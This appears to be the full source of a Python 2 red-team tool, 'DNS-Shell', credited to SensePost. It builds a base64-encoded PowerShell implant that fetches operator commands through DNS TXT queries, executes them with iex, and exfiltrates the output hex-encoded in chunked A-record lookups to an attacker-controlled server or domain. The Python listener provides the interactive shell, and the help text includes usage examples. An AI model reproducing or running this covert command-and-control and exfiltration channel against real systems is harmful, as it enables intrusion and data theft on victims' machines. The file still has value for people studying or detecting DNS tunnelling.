import argparse
import time
import traceback
import base64
import re
import sys
import binascii
import threading
import SocketServer
import requests
from dnslib import *


def powershell_encode(data):
    # blank command will store our fixed unicode variable
    blank_command = ""
    powershell_command = ""
    # Remove weird chars that could have been added by ISE
    n = re.compile(u'(\xef|\xbb|\xbf)')
    # loop through each character and insert null byte
    for char in (n.sub("", data)):
        # insert the nullbyte
        blank_command += char + "\x00"
    # assign powershell command as the new one
    powershell_command = blank_command
    # base64 encode the powershell command
    powershell_command = base64.b64encode(powershell_command)
    return powershell_command


def prepare_recursive(domain):
   st2 = """
$url = "%s";
function execDNS($cmd) {
$c = iex $cmd 2>&1 | Out-String;
$u = [system.Text.Encoding]::UTF8.GetBytes($c);
$string = [System.BitConverter]::ToString($u);
$string = $string -replace '-','';
$len = $string.Length;
$split = 50;
$repeat=[Math]::Floor($len/$split);
$remainder=$len%%$split;
if($remainder){ $repeatr = $repeat+1};
$rnd = Get-Random;$ur = $rnd.toString()+".CMDC"+$repeatr.ToString()+"."+$url;
$q = nslookup -querytype=A $ur;
for($i=0;$i-lt$repeat;$i++){
    $str = $string.Substring($i*$Split,$Split);
    $rnd = Get-Random;$ur1 = $rnd.toString()+".CMD"+$i.ToString()+"."+$str+"."+$url;
    $q = nslookup -querytype=A $ur1;
};
if($remainder){
    $str = $string.Substring($len-$remainder);
    $i = $i +1
    $rnd = Get-Random;$ur2 = $rnd.toString()+".CMD"+$i.ToString()+"."+$str+"."+$url;
    $q = nslookup -querytype=A $ur2;
};
$rnd=Get-Random;$s=$rnd.ToString()+".END."+$url;$q = nslookup -querytype=A $s;
};
while (1){
   $c = Get-Random;
   Start-Sleep -s 3
   $u=$c.ToString()+"."+$url;$txt = nslookup -querytype=TXT $u | Out-String
   $txt = $txt.split("`n") | %%{$_.split('"')[1]} | Out-String
   if ($txt -match 'NoCMD'){continue}
   elseif ($txt -match 'exit'){Exit}
   else{execDNS($txt)}
}   
""" % (domain,)
   return powershell_encode(st2)

def prepare_direct(ip):
   st2 = """
$ip = "%s"
function execDNS($cmd) {
$c = iex $cmd 2>&1 | Out-String;
$u = [system.Text.Encoding]::UTF8.GetBytes($c);
$string = [System.BitConverter]::ToString($u);
$string = $string -replace '-','';
$len = $string.Length;
$split = 50;
$repeat=[Math]::Floor($len/$split);
$remainder=$len%%$split;
if($remainder){ $repeatr = $repeat+1};
$rnd = Get-Random;$ur = $rnd.ToString()+".CMDC"+$repeatr.ToString()+"."+$url;
$q = nslookup -querytype=A $ur $ip;
for($i=0;$i-lt$repeat;$i++){
    $str = $string.Substring($i*$Split,$Split);
    $rnd = Get-Random;$ur1 = $rnd.ToString()+".CMD"+$i.ToString()+"."+$str+"."+$url;
    $q = nslookup -querytype=A $ur1 $ip;
};
if($remainder){
    $str = $string.Substring($len-$remainder);
    $i = $i +1
    $rnd = Get-Random;$ur2 = $rnd.ToString()+".CMD"+$i.ToString()+"."+$str+"."+$url;
    $q = nslookup -querytype=A $ur2 $ip;
};
$rnd = Get-Random;$s=$rnd.ToString()+".END."+$url;$q = nslookup -querytype=A $s $ip;
};
while (1){
   Start-Sleep -s 3
   $rnd = Get-Random;$u = $rnd.ToString()+"."+$url
   $txt = nslookup -querytype=TXT $u $ip | Out-String
   $txt = $txt.split("`n") | %%{$_.split('"')[1]} | Out-String
   if ($txt -match 'NoCMD'){continue}
   elseif ($txt -match 'exit'){Exit}
   else{execDNS($txt)}
}   
""" % (ip,)
   return powershell_encode(st2)


def parse_output(req):
    global cmd
    cmd = 'NoCMD'
    request = req
    reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
    rdata = A('127.0.0.1') 
    TTL = 60 * 5
    rqt = rdata.__class__.__name__
    cmds.append([request.q.qname.label[1],request.q.qname.label[3]])
    if request.q.qname.label[2] == 'sqsp' and request.q.qname.label[1] != 'END' and 'LENGTH' not in cmds:
	cmds.append('LENGTH')
	rcvtime = time.time()
	expected = int(request.q.qname.label[1][4:])
	print "[+] Expecting %s Chunks." % request.q.qname.label[1][4:]
    if request.q.qname.label[2] != 'sqsp':
	if request.q.qname.label[1] not in cmds:
           cmds.append(request.q.qname.label[1])
    	   c = request.q.qname.label[2]
    	   cm = c.decode('hex')
	   cr.append(cm)
	   sys.stdout.write("\r[+] Chunks Recieved: %d" % len(cr))
	   sys.stdout.flush()
    if request.q.qname.label[1] == 'END':
	cmds.append('END')
    reply.add_answer(RR(rname=request.q.qname, rtype=1, rclass=1, ttl=TTL, rdata=rdata))
    return reply.pack()

def parse_newCMD(request):
    global cmd
    reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
    TTL = 60 * 5
    rdata = TXT(cmd)
    cmd = 'NoCMD'
    rqt = rdata.__class__.__name__
    reply.add_answer(RR(rname=request.q.qname, rtype=QTYPE.TXT, rclass=1, ttl=TTL, rdata=rdata))
    return reply.pack()


def dns_response(data):
    request = DNSRecord.parse(data)
    qname = request.q.qname
    qn = str(qname)
    qtype = request.q.qtype
    qt = QTYPE[qtype]
    if qt == 'A':
       reply = parse_output(request)
    elif qt == 'TXT':
       reply = parse_newCMD(request)
    return reply

class BaseRequestHandler(SocketServer.BaseRequestHandler):

    def get_data(self):
        raise NotImplementedError

    def send_data(self, data):
        raise NotImplementedError

    def handle(self):
        try:
            data = self.get_data()
            self.send_data(dns_response(data))
        except Exception:
            pass

class UDPRequestHandler(BaseRequestHandler):

    def get_data(self):
	global newConn,recvConn,client_ip
	if newConn:
	   newConn = 0
	   recvConn = 1
	   client_ip = self.client_address
	   print "[+] Recieved Connection from %s" % client_ip[0]
        return self.request[0].strip()

    def send_data(self, data):
        return self.request[1].sendto(data, self.client_address)

def main(penc, WebRequestFile=None,single=None):
	global cmd,cmds,cr,rcvtime,newCommand,recvConn,client_ip
	UDP_PORT = 53
	s = SocketServer.ThreadingUDPServer(('',UDP_PORT),UDPRequestHandler)
        thread = threading.Thread(target=s.serve_forever)  
        thread.daemon = True  # exit the server thread when the main thread terminates
        try:
           thread.start()
	   if WebRequestFile:
	      thread2 = threading.Thread(target=send_reqT, args=(penc,))
	      thread2.daemon = True
	      thread2.start()
	   else:
		print "[+] Generated Payload:\n%s" % penc
	   while thread.isAlive():
	      time.sleep(1)
	      sys.stdout.flush()
	      sys.stderr.flush()
	      if recvConn:
  	         if len(cmds) >= 1 and cmds[-1] == 'END' or newCommand:
		    newCommand = 0
	   	    print "\n\n%s" % ''.join(cr)
		    print "[+] Command Completed Successfully."
		    cmds = []
		    cr = []
		    if single:
                       s.shutdown()
		       sys.exit()	
		    else:
	               cmd = raw_input('SensePost-DNS-Shell::$ ')
		    if cmd == 'exit':
		       time.sleep(5)
                       s.shutdown()
		       sys.exit()	
	except KeyboardInterrupt:
	   print "%s" % ''.join(cr)	
	   cmd = 'exit'
	   time.sleep(5)
	   #print("[+] 1st packet: %s seconds" % (time.time()-rcvtime))
	   s.shutdown()
	   sys.exit()
	except:
	   raise


if __name__=='__main__':
	logo = '''
________    _______    _________           _________.__           .__  .__   
\______ \   \      \  /   _____/          /   _____/|  |__   ____ |  | |  |  
 |    |  \  /   |   \ \_____  \   ______  \_____  \ |  |  \_/ __ \|  | |  |  
 |    `   \/    |    \/        \ /_____/  /        \|   Y  \  ___/|  |_|  |__
/_______  /\____|__  /_______  /         /_______  /|___|  /\___  >____/____/
        \/         \/        \/                  \/      \/     \/           

								by research (at) SensePost
'''
	cmds = []
	cr = []
	rcvtime = 0.0
	cmd = 'NoCMD'
	newCommand = 1
	recvConn = 0
	newConn = 1
	client_ip = None
	parser = argparse.ArgumentParser(
		description = '''
A Sort of DNS-SHell.
%s
''' % logo,
		formatter_class=argparse.RawTextHelpFormatter,
		epilog = '''
Examples:

# Generate base64 encoded PowerShell payload, run in listener direct queries mode and wait for interactive shell.
sudo python DNS-Shell.py -l -d [Server IP]

# Generate base64 encoded PowerShell payload, and run in listener recursive queries mode and wait for interactive shell.
sudo python DNS-Shell.py -l -r [Domain]''')
	parser.add_argument('-l','--listen',help='Activate listener mode.',action='store_true')
	parser.add_argument('-r','--recursive',help='Recursive DNS query requests.')
	parser.add_argument('-d','--direct',help='Direct DNS queries mode.')
	p = parser.parse_args()
	print logo
	# listener direct mode
	if p.listen and p.direct:
		print '[+} Listen direct queries mode active.'
		listen = p.listen
		ip = p.direct
		penc = prepare_direct(ip)
		main(penc)
	# listener recursive mode
	elif p.listen and p.recursive:
		print '[+] Listener recursive queries mode active.'
		listen = p.listen
                domain = p.recursive
		penc = prepare_recursive(domain)
		main(penc)
	else:
		parser.print_help()

